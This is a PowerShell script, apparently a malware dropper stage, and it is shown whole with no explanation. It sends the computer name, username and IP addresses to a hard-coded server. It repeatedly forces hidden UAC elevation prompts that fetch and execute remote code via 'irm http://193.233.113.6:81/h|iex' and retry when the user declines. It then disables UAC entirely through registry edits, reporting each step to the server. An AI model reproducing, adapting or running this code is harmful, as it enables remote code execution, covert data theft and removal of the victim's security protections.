$null = Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

function Send-ErrorToServer {
    param (
        [string]$ErrorMessage,
        [string]$Command
    )

    $server = "http://193.233.113.6:81/api/powershell-error"
    $machine = $env:COMPUTERNAME
    $username = $env:USERNAME

    try {
        $localIp = (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object {
                $_.IPAddress -notlike "169.*" -and
                $_.IPAddress -ne "127.0.0.1"
            } |
            Select-Object -First 1 -ExpandProperty IPAddress)
    } catch {
        $localIp = "unknown"
    }

    try {
        $publicIp = Invoke-RestMethod "https://api.ipify.org"
    } catch {
        $publicIp = "unknown"
    }

    $body = @{
        machine  = $machine
        username = $username
        localIp  = $localIp
        publicIp = $publicIp
        script   = $MyInvocation.ScriptName
        command  = $Command
        error    = $ErrorMessage
        time     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $server -Method POST -ContentType "application/json" -Body $body
    } catch {
    }
}

function Test-IsAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Test-LaunchedFromWinlogon {
    try {
        $current = Get-CimInstance Win32_Process -Filter "ProcessId=$PID"
        if (-not $current) { return $false }

        $parent = Get-CimInstance Win32_Process -Filter "ProcessId=$($current.ParentProcessId)"
        if (-not $parent) { return $false }

        return $parent.Name -in @('userinit.exe', 'winlogon.exe')
    }
    catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command $_.InvocationInfo.Line
        return $false
    }
}


$LaunchedFromWinlogon = Test-LaunchedFromWinlogon

if (-not $LaunchedFromWinlogon -and -not (Test-IsAdmin)) {
    while (-not (Test-IsAdmin)) {
        try {
            $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm http://193.233.113.6:81/h|iex`""
            Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
            exit
        } catch {
            # Специальная обработка отказа в UAC (пользователь нажал Close/No)
            $err = $_.Exception
            $msgToSend = $err.Message
            if ($err -is [System.ComponentModel.Win32Exception] -and $err.NativeErrorCode -eq 1223) {
                # 1223: The operation was canceled by the user
                $msgToSend = "User pressing close button"
            }
            Send-ErrorToServer -ErrorMessage $msgToSend -Command $_.InvocationInfo.Line
            Write-Host "User privileges." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
}
# ===== UAC control logic (Windows 10/11) =====

function Test-IsWin10Or11 {
    try {
        $ver = [System.Environment]::OSVersion.Version
        return $ver.Major -eq 10   # Win10/11
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "UAC:Test-IsWin10Or11"
        return $false
    }
}

function Get-UacState {
    param(
        [ref]$enableLUA,
        [ref]$consentBehavior
    )

    $enableLUA.Value      = $null
    $consentBehavior.Value = $null

    try {
        $keyPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        $props   = Get-ItemProperty -Path $keyPath -ErrorAction Stop
        $enableLUA.Value       = $props.EnableLUA
        $consentBehavior.Value = $props.ConsentPromptBehaviorAdmin
        return $true
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "UAC:Get-UacState"
        return $false
    }
}

function Disable-UacCompletely {
    try {
        if (-not (Test-IsAdmin)) {
            Send-ErrorToServer -ErrorMessage "Cannot change UAC: not running as administrator" -Command "UAC:Disable:NotAdmin"
            return
        }

        if (-not (Test-IsWin10Or11)) {
            Send-ErrorToServer -ErrorMessage "UAC change skipped: OS is not Windows 10/11" -Command "UAC:Disable:WrongOS"
            return
        }

        $enableLUA = $null
        $consent   = $null
        $stateOk   = Get-UacState -enableLUA ([ref]$enableLUA) -consentBehavior ([ref]$consent)

        if ($stateOk) {
            Send-ErrorToServer -ErrorMessage "Current UAC state: EnableLUA=$enableLUA, ConsentPromptBehaviorAdmin=$consent" -Command "UAC:State:Before"
        }

        if ($stateOk -and $enableLUA -eq 0) {
            Send-ErrorToServer -ErrorMessage "UAC is already fully disabled (EnableLUA=0). No changes required." -Command "UAC:Disable:AlreadyDisabled"
            return
        }

        $keyPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'

        Send-ErrorToServer -ErrorMessage "Disabling UAC: setting EnableLUA=0 and ConsentPromptBehaviorAdmin=0" -Command "UAC:Disable:Start"

        New-ItemProperty -Path $keyPath -Name 'EnableLUA' -Value 0 -PropertyType DWord -Force | Out-Null
        New-ItemProperty -Path $keyPath -Name 'ConsentPromptBehaviorAdmin' -Value 0 -PropertyType DWord -Force | Out-Null

        $enableLUA2 = $null
        $consent2   = $null
        $stateOk2   = Get-UacState -enableLUA ([ref]$enableLUA2) -consentBehavior ([ref]$consent2)

        if ($stateOk2) {
            Send-ErrorToServer -ErrorMessage "New UAC state: EnableLUA=$enableLUA2, ConsentPromptBehaviorAdmin=$consent2" -Command "UAC:State:After"
        } else {
            Send-ErrorToServer -ErrorMessage "Failed to re-read UAC state after modification" -Command "UAC:Disable:VerifyFailed"
        }

        Send-ErrorToServer -ErrorMessage "UAC disabling logic completed (system restart required to fully apply)" -Command "UAC:Disable:Done"
    } catch {
        Send-ErrorToServer -ErrorMessage $_.Exception.Message -Command "UAC:Disable:Error"
    }
}

Disable-UacCompletely

try {
    [Console]::CursorVisible = $true
} catch {
}
exit
